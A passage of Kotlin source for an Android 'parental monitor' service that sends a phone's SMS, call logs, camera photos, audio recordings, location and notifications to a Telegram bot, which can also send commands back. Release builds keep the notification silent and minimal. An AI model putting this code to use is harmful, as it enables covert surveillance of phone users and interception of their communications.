package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMediaClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.CrashReporter
import com.redeye.parentalmonitor.utils.Html
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import com.redeye.parentalmonitor.utils.TimeFmt
import kotlinx.coroutines.*
import android.os.BatteryManager
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val scopeErrorHandler = CoroutineExceptionHandler { _, error ->
        try {
            CrashReporter.saveNow(this, error)
        } catch (_: Exception) {
        }
        android.util.Log.e("MonitoringService", "Background failure recorded: ${redactToken(error.message)}")
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + scopeErrorHandler)
    private val cameraBusy = AtomicBoolean(false)
    private val smsBusy = AtomicBoolean(false)
    private val ringBusy = AtomicBoolean(false)
    private val recordBusy = AtomicBoolean(false)
    private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
    private val photoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
    @Volatile
    private var activeAudioFile: File? = null
    @Volatile
    private var activePhotoFile: File? = null
    private var ringJob: Job? = null
    private var recordJob: Job? = null
    private var smsJob: Job? = null
    private var watchdogJob: Job? = null
    private var loopWatchdogJob: Job? = null
    private var loopWatchdogNoticeAt = 0L
    private var serviceStartAt = 0L
    private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
    @Volatile
    private var appliedFgsTypes = 0

    private enum class MediaSendOutcome {
        SENT, KEPT, DROPPED
    }
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null
    private var commandJob: Job? = null
    private var initialSyncJob: Job? = null
    private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
    @Volatile
    private var cachedBotToken = ""
    @Volatile
    private var cachedChatId = ""
    @Volatile
    private var cachedOwnerId = 0L
    private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
    @Volatile
    private var credsCheckAt = 0L
    @Volatile
    private var netCheckAt = 0L
    @Volatile
    private var netCached = false
    @Volatile
    private var cachedCameraInterval = -1
    @Volatile
    private var cachedMonitoringPaused = false
    @Volatile
    private var cachedPhotoPausedUntil = 0L
    @Volatile
    private var cachedSyncInterval = -1
    private var cachedSetupTap: android.app.PendingIntent? = null
    private val handledUpdateIds = java.util.Collections.synchronizedSet(LinkedHashSet<Long>())
    private val handledCallbackIds = java.util.Collections.synchronizedSet(LinkedHashSet<String>())

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{3,15}$")
        private val CMD_SPLIT_REGEX = "\\s+".toRegex()
        private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
        private val SENSITIVE_COMMANDS = setOf("/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
        private const val COMMAND_MAX_AGE_SEC = 900L
        private const val NOTIFICATION_ID = 1
        private const val MAX_AUDIO_KEPT = 5
        private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
        private val smsReqSeq = java.util.concurrent.atomic.AtomicInteger((System.currentTimeMillis() and 0xfffffff).toInt())
        private val authReminderAt = java.util.concurrent.atomic.AtomicLong(0L)
        private const val AUTH_NOTIF_ID = 4
        @Volatile
        var isRunning = false

    }

    override fun onCreate() {
        super.onCreate()
        startForegroundImmediate()
        preferencesManager = PreferencesManager.getInstance(this)
        try {
            Thread {
                try {
                    if (PreferencesManager.refreshInstance(this)) {
                        refreshCreds()
                        refreshLoopConfig()
                    }
                } catch (_: Exception) {
                }
            }.start()
        } catch (_: Exception) {
        }
        credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == PreferencesManager.KEY_BOT_TOKEN || key == PreferencesManager.KEY_CHAT_ID) refreshCreds()
            if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL || key == PreferencesManager.KEY_SYNC_INTERVAL) refreshLoopConfig()
            if (key == PreferencesManager.KEY_CAMERA_INTERVAL || key == PreferencesManager.KEY_MONITORING_PAUSED || key == PreferencesManager.KEY_PHOTO_PAUSED_UNTIL) restartCameraLoop()
        }
        try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue.getInstance(this)
        cameraService = CameraService(this)
    }

    private fun startForegroundImmediate() {
        try {
            val tap = try { setupTapIntent() } catch (_: Exception) { null }
            val builder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setSilent(true)
                .setShowWhen(false)
            if (tap != null) builder.setContentIntent(tap)
            val notification = builder.build()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    appliedFgsTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                } catch (_: Exception) {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Immediate foreground start failed: ${redactToken(e.message)}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundImmediate()
        when (intent?.action) {
            ACTION_START_MONITORING -> {
                startMonitoring()
                return START_STICKY
            }
            else -> {
                if (shouldAutoResume()) {
                    startMonitoring()
                    return START_STICKY
                } else if (needsCredsRetry()) {
                    MessageScheduler.scheduleBootRestart(this)
                    return START_NOT_STICKY
                } else {
                    stopSelf()
                    return START_NOT_STICKY
                }
            }
        }
    }

    private fun shouldAutoResume(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }

    private fun needsCredsRetry(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && !preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }


    private fun sha256Hex(value: String): String {
        return try {
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(value.toByteArray(Charsets.UTF_8))
            digest.joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            value.hashCode().toString()
        }
    }

    private fun redactToken(value: String?): String {
        if (value.isNullOrEmpty()) return value ?: ""
        val token = try {
            cachedBotToken.ifEmpty { preferencesManager.botToken }
        } catch (_: Exception) {
            ""
        }
        if (token.isEmpty()) return value.replace(Regex("[0-9]{5,15}:[A-Za-z0-9_-]{20,}"), "***")
        return value.replace(token, "***")
    }

    private fun startMonitoring() {
        try {
            if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
                android.util.Log.w("MonitoringService", "Monitoring disabled by user; not starting")
                stopMonitoring()
                return
            }
        } catch (_: Exception) {
        }
        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true && loopWatchdogJob?.isActive == true) {
            refreshCreds()
            return
        }
        serviceStartAt = System.currentTimeMillis()
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")

        // Cancel any previous loops so a restart never duplicates work
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        idlePolls = 0
        refreshCreds()
        refreshLoopConfig()

        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(setupTapIntent())
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        var foregroundTypes = computeForegroundTypes()
        val foregroundNotification = try {
            notificationBuilder.build()
        } catch (_: Exception) {
            stopSelf()
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, foregroundNotification, foregroundTypes)
                appliedFgsTypes = foregroundTypes
            } else {
                startForeground(NOTIFICATION_ID, foregroundNotification)
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal: ${redactToken(e.message)}")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        foregroundNotification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                    appliedFgsTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                } else {
                    startForeground(NOTIFICATION_ID, foregroundNotification)
                }
            } catch (_: Exception) {
                stopSelf()
                return
            }
        }
        isRunning = true
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started")
        if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
            serviceScope.launch {
                sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
            }
        }

        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted) {
            preferencesManager.initialSyncStarted = true
            initialSyncRunning.set(true)
        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted) {
            initialSyncRunning.set(true)
        }
        startPeriodicLoops()
        initialSyncJob = serviceScope.launch {
            try {
                if (initialSyncRunning.get()) {
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                    sendInitialData()
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                }
            } catch (_: Exception) {
            } finally {
                initialSyncRunning.set(false)
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
        try {
            messageQueue.tryRestorePersistent()
        } catch (_: Exception) {
        }
        val stuckRing = preferencesManager.ringPrevVolume
        val ringSavedAt = preferencesManager.ringSavedAt
        val ringingNow = try { ringBusy.get() || ringJob?.isActive == true } catch (_: Exception) { false }
        if (!ringingNow && stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 12 * 60 * 60_000L) {
            try {
                val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
            preferencesManager.ringSavedAt = 0L
        } else if (!ringingNow && (stuckRing >= 0 || ringSavedAt > 0)) {
            preferencesManager.ringPrevVolume = -1
            preferencesManager.ringSavedAt = 0L
        }
        startCommandPolling()
        startLoopWatchdog()
        MessageScheduler.scheduleWatchdog(this)
        MessageScheduler.scheduleMessageSend(this)
        serviceScope.launch {
            registerBotCommands()
        }
    }

    private fun startPeriodicLoops() {
        monitoringJob = serviceScope.launch {
            while (isActive && monitoringJob === coroutineContext[Job]) {
                try {
                    if (!cachedMonitoringPaused) {
                        checkAndSendNewData()
                        try {
                            flushPendingAudio()
                        } catch (_: Exception) {
                        }
                        try {
                            flushPendingPhotos()
                        } catch (_: Exception) {
                        }
                        chunkedDelay(syncIntervalMillis())
                    } else {
                        chunkedDelay(15 * 60_000L)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop: ${redactToken(e.message)}")
                }
            }
        }
        startCameraLoop()
    }

    private fun restartCameraLoop() {
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        startCameraLoop()
    }

    private fun startCameraLoop() {
        cameraJob = serviceScope.launch {
            while (isActive && cameraJob === coroutineContext[Job]) {
                try {
                    if (cachedCameraInterval < 0) refreshLoopConfig()
                    val minutes = cachedCameraInterval.coerceIn(0, 60)
                    val paused = System.currentTimeMillis() < cachedPhotoPausedUntil
                    if (!cachedMonitoringPaused && !paused && minutes > 0) {
                        captureAndSendPhoto()
                        chunkedDelay(minutes * 60_000L)
                    } else if (cachedMonitoringPaused) {
                        chunkedDelay(5 * 60_000L)
                    } else {
                        val remaining = cachedPhotoPausedUntil - System.currentTimeMillis()
                        val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
                        chunkedDelay(idle)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop: ${redactToken(e.message)}")
                }
            }
        }
    }

    private suspend fun chunkedDelay(totalMs: Long) {
        if (totalMs <= 0L) return
        var remaining = totalMs
        while (remaining > 0L) {
            currentCoroutineContext().ensureActive()
            val step = remaining.coerceAtMost(5_000L)
            delay(step)
            remaining -= step
        }
    }

    private fun refreshCreds() {
        try {
            cachedBotToken = preferencesManager.botToken
            cachedChatId = preferencesManager.chatId
            cachedOwnerId = preferencesManager.ownerUserId
        } catch (_: Exception) {
        }
    }

    private fun isOwner(senderId: String): Boolean {
        if (senderId.isEmpty()) return false
        if (senderId == cachedChatId) return true
        return cachedOwnerId != 0L && senderId == cachedOwnerId.toString()
    }

    private fun rememberOwner(id: Long): Boolean {
        if (id == 0L) return false
        if (id == cachedOwnerId) return false
        cachedOwnerId = id
        try {
            preferencesManager.ownerUserId = id
        } catch (_: Exception) {
        }
        return true
    }

    private fun isFreshLocation(last: android.location.Location): Boolean {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
                android.os.SystemClock.elapsedRealtimeNanos() - last.elapsedRealtimeNanos < 120_000_000_000L
            } else {
                System.currentTimeMillis() - last.time < 120_000L
            }
        } catch (_: Exception) {
            false
        }
    }

    private fun refreshLoopConfig() {
        try {
            cachedCameraInterval = preferencesManager.cameraInterval
            cachedMonitoringPaused = preferencesManager.monitoringPaused
            cachedPhotoPausedUntil = photoPausedElapsed()
            cachedSyncInterval = preferencesManager.syncInterval
        } catch (_: Exception) {
        }
    }

    private fun sendCreds(): Pair<String, String> {
        if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - credsCheckAt > 300_000L) {
            credsCheckAt = now
            refreshCreds()
        }
        return cachedBotToken to cachedChatId
    }

    private fun hasNetwork(): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - netCheckAt < 20_000L) return netCached
        netCheckAt = now
        netCached = NetworkUtils.isNetworkAvailable(this)
        return netCached
    }

    // ═══════════════════════════════════════════════════════════
    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
    // ═══════════════════════════════════════════════════════════

    private var idlePolls = 0

    private fun startCommandPolling() {
        commandJob = serviceScope.launch {
            while (isActive && commandJob === coroutineContext[Job]) {
                if (cachedMonitoringPaused) {
                    try {
                        pollTelegramCommands()
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        android.util.Log.e("MonitoringService", "Error polling commands while paused: ${redactToken(e.message)}")
                    } catch (t: Throwable) {
                        android.util.Log.e("MonitoringService", "Fatal polling error while paused, loop survives")
                    }
                    delay(60_000)
                    continue
                }
                try {
                    val active = pollTelegramCommands()
                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(4)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error polling commands: ${redactToken(e.message)}")
                } catch (t: Throwable) {
                    android.util.Log.e("MonitoringService", "Fatal polling error, loop survives")
                }
                if (!preferencesManager.isConfigured()) {
                    try {
                        if (PreferencesManager.refreshInstance(this@MonitoringService)) {
                            preferencesManager = PreferencesManager.getInstance(this@MonitoringService)
                            refreshCreds()
                            refreshLoopConfig()
                            try {
                                credsListener?.let { preferencesManager.registerChangeListener(it) }
                            } catch (_: Exception) {
                            }
                        }
                    } catch (_: Exception) {
                    }
                    delay(60_000)
                } else if (!hasNetwork()) {
                    delay(60_000)
                } else if (NetworkUtils.isAuthBlocked(preferencesManager)) {
                    delay(300_000)
                } else {
                    delay((10_000L + idlePolls * 5_000L).coerceAtMost(30_000L))
                }
            }
        }
    }



    private suspend fun pollTelegramCommands(): Boolean {
        if (NetworkUtils.isAuthBlocked(preferencesManager)) return false
        val (botToken, chatId) = sendCreds()
        if (botToken.isEmpty() || chatId.isEmpty()) return false

        val offset = preferencesManager.lastUpdateId + 1
        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30"

        var response = try {
            TelegramClient.api.getUpdates(url)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            return false
        }
        if (response.code() == 401 || response.code() == 403) {
            try {
                refreshCreds()
            } catch (_: Exception) {
            }
            val (freshToken, freshChat) = sendCreds()
            if (freshToken.isNotEmpty() && freshToken != botToken) {
                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30"
                response = try {
                    TelegramClient.api.getUpdates(retryUrl)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    return false
                }
            }
        }
        if (response.code() == 401 || response.code() == 403) {
            try {
                preferencesManager.credentialError = response.code().toString()
                preferencesManager.credentialErrorAt = System.currentTimeMillis()
            } catch (_: Exception) {
            }
            try {
                postAuthFailureReminder(response.code())
            } catch (_: Exception) {
            }
            return false
        }
        if (response.code() == 409) {
            android.util.Log.w("MonitoringService", "getUpdates conflict: another consumer is polling, backing off")
            idlePolls = 4
            return false
        }
        if (response.code() == 429) {
            val retryAfter = try {
                NetworkUtils.parseRetryAfter(response.errorBody()?.string())
            } catch (_: Exception) {
                5L
            }
            android.util.Log.w("MonitoringService", "getUpdates rate limited, backing off ${retryAfter}s")
            try {
                delay(retryAfter.coerceIn(1L, 300L) * 1000L)
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (_: Exception) {
            }
            return false
        }
        if (response.code() == 400) {
            try {
                val body = response.errorBody()?.string()?.lowercase(java.util.Locale.ROOT).orEmpty()
                if (body.contains("offset")) {
                    try { preferencesManager.setLastUpdateIdSync(0L) } catch (_: Exception) { }
                }
            } catch (_: Exception) {
            }
            return false
        }
        if (!response.isSuccessful || response.body()?.ok != true) return false
        try {
            preferencesManager.credentialError = ""
            preferencesManager.credentialErrorAt = 0L
        } catch (_: Exception) {
        }

        val updates = response.body()?.result ?: return false
        if (updates.isEmpty()) return false
        for (update in updates) {
            val seen = synchronized(handledUpdateIds) {
                val s = !handledUpdateIds.add(update.updateId)
                while (handledUpdateIds.size > 300) {
                    try {
                        val it = handledUpdateIds.iterator()
                        if (it.hasNext()) {
                            it.next()
                            it.remove()
                        } else {
                            break
                        }
                    } catch (_: Exception) {
                        break
                    }
                }
                s
            }
            if (seen) continue
            try {
                if (update.updateId > preferencesManager.lastUpdateId) {
                    preferencesManager.setLastUpdateIdSync(update.updateId)
                }
            } catch (_: Exception) {
            }
            try {
                val callback = update.callbackQuery
                if (callback != null) {
                    handleCallbackQuery(callback)
                } else {
                    val message = update.message ?: update.editedMessage ?: update.channelPost ?: update.editedChannelPost
                    val msgChatId = message?.chat?.id?.toString().orEmpty()
                    val senderId = message?.from?.id?.toString().orEmpty()
                    val chatOk = msgChatId.isNotEmpty() && msgChatId == chatId
                    val rawText = (message?.text ?: message?.caption)?.trim().orEmpty()
                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && rawText.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT) == "/start") {
                        val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
                        if (learned) {
                            serviceScope.launch {
                                registerBotCommands()
                            }
                            serviceScope.launch {
                                sendToTelegram("Owner linked via /start.")
                            }
                        }
                    }
                    val ownerOk = isOwner(senderId)
                    val full = (message?.text ?: message?.caption)?.trim()
                    if ((chatOk || ownerOk) && full != null) {
                        val head = full.substringBefore(" ")
                        val command = head.substringBefore("@").lowercase(java.util.Locale.ROOT)
                        if (command.startsWith("/")) {
                            val arg = if (head.length < full.length) full.substring(head.length + 1).trim() else ""
                            val input = if (arg.isEmpty()) command else "$command $arg"
                            val wakeSeen = command == "/ping" && try { preferencesManager.wakePingSeen(update.updateId) } catch (_: Exception) { false }
                            handleTelegramCommand(input, message?.date ?: 0, ownerOk, chatOk, wakeSeen, senderId)
                            if (wakeSeen) {
                                try { preferencesManager.removeWakePingId(update.updateId) } catch (_: Exception) { }
                            }
                        }
                    }
                }
            } finally {
                try {
                    if (update.updateId > preferencesManager.lastUpdateId) {
                        preferencesManager.setLastUpdateIdSync(update.updateId)
                    }
                } catch (_: Exception) {
                }
            }
        }
        return true
    }

    private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
        val sender = query.from?.id?.toString() ?: return
        val dupCallback = synchronized(handledCallbackIds) {
            val seen = !handledCallbackIds.add(query.id)
            while (handledCallbackIds.size > 200) {
                try {
                    val it = handledCallbackIds.iterator()
                    if (it.hasNext()) {
                        it.next()
                        it.remove()
                    } else {
                        break
                    }
                } catch (_: Exception) {
                    break
                }
            }
            seen
        }
        val chatId = try { preferencesManager.chatId } catch (_: Exception) { "" }
        val originChat = try { query.message?.chat?.id?.toString().orEmpty() } catch (_: Exception) { "" }
        if (sender != chatId && originChat != chatId) {
            try { answerCallback(query.id) } catch (_: Exception) { }
            return
        }
        val ownerOk = isOwner(sender)
        answerCallback(query.id)
        if (dupCallback) return
        val command = when (query.data) {
            "photo" -> "/photo"
            "location" -> "/location"
            "lastcalls" -> "/lastcalls"
            "lastsms" -> "/lastsms"
            "battery" -> "/battery"
            "status" -> "/status"
            "stop" -> "/stop"
            "resume" -> "/resume"
            "camfront" -> "/camera depan"
            "camback" -> "/camera belakang"
            "pause60" -> "/pause 60"
            else -> return
        }
        val originOk = originChat.isNotEmpty() && originChat == chatId
        val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
        handleTelegramCommand(command, pressedAt, ownerOk, originOk, false, sender)
    }

    private fun postAuthFailureReminder(code: Int) {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - authReminderAt.get() < 6 * 60 * 60_000L) return
        authReminderAt.set(now)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != android.content.pm.PackageManager.PERMISSION_GRANTED
            ) return
            val tap = android.app.PendingIntent.getActivity(
                this,
                1,
                Intent(this, com.redeye.parentalmonitor.ui.SetupActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP),
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )
            val title = if (code == 400) "Chat not found (400)" else "Bot token rejected ($code)"
            val text = if (code == 400) "Open Setup to fix the chat ID so messages work again." else "Open Setup to fix the token so commands work again."
            val notification = NotificationCompat.Builder(this, ParentalMonitorApp.RESUME_CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle(title)
                .setContentText(text)
                .setContentIntent(tap)
                .setAutoCancel(true)
                .build()
            val manager = getSystemService(NOTIFICATION_SERVICE) as android.app.NotificationManager
            manager.notify(AUTH_NOTIF_ID, notification)
        } catch (_: Exception) {
        }
    }

    private suspend fun answerCallback(callbackId: String) {
        try {
            val token = sendCreds().first.ifEmpty { preferencesManager.botToken }
            val url = "https://api.telegram.org/bot${token}/answerCallbackQuery"
            TelegramClient.api.answerCallbackQuery(url, mapOf("callback_query_id" to callbackId))
        } catch (_: Exception) {
        }
    }

    private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
        return listOf(
            com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera front|back"),
            com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
            com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
            com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
            com.redeye.parentalmonitor.network.BotCommand("photointerval", "Set photo interval 0-60 min"),
            com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
            com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
            com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
            com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
            com.redeye.parentalmonitor.network.BotCommand("syncinterval", "Set sync interval 1-1440 min"),
            com.redeye.parentalmonitor.network.BotCommand("restart", "Restart monitoring loops"),
            com.redeye.parentalmonitor.network.BotCommand("flush", "Send queued messages now"),
            com.redeye.parentalmonitor.network.BotCommand("clearqueue", "Drop queued messages"),
            com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
            com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
            com.redeye.parentalmonitor.network.BotCommand("ping", "Check delay, wake: /ping [camera|location]"),
            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms number message"),
            com.redeye.parentalmonitor.network.BotCommand("smsconfirm", "Confirm pending SMS"),
            com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
            com.redeye.parentalmonitor.network.BotCommand("version", "Show app/device version"),
            com.redeye.parentalmonitor.network.BotCommand("uptime", "Show service uptime"),
            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts name"),
            com.redeye.parentalmonitor.network.BotCommand("apps", "List installed apps"),
            com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
            com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
            com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
        )
    }

    private fun publicCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
        return listOf(
            com.redeye.parentalmonitor.network.BotCommand("ping", "Check delay"),
            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
        )
    }

    private suspend fun registerBotCommands() {
        try {
            val botToken = preferencesManager.botToken
            if (botToken.isEmpty()) return
            val ownerId = try { preferencesManager.ownerUserId } catch (_: Exception) { 0L }
            val tokenHash = sha256Hex(botToken + ":" + ownerId)
            try {
                if (preferencesManager.commandsTokenHash == tokenHash) return
            } catch (_: Exception) {
            }
            val url = "https://api.telegram.org/bot$botToken/setMyCommands"
            val publicResp = TelegramClient.api.setMyCommands(url, com.redeye.parentalmonitor.network.SetMyCommandsRequest(publicCommandList()))
            var ownerOk = true
            if (ownerId != 0L) {
                val ownerBody = com.redeye.parentalmonitor.network.SetMyCommandsRequest(
                    botCommandList(),
                    com.redeye.parentalmonitor.network.BotCommandScope("bot_command_scope_chat", ownerId)
                )
                val ownerResp = TelegramClient.api.setMyCommands(url, ownerBody)
                ownerOk = ownerResp.isSuccessful && ownerResp.body()?.ok == true
            }
            if (publicResp.isSuccessful && publicResp.body()?.ok == true && ownerOk) {
                try {
                    preferencesManager.commandsTokenHash = tokenHash
                } catch (_: Exception) {
                }
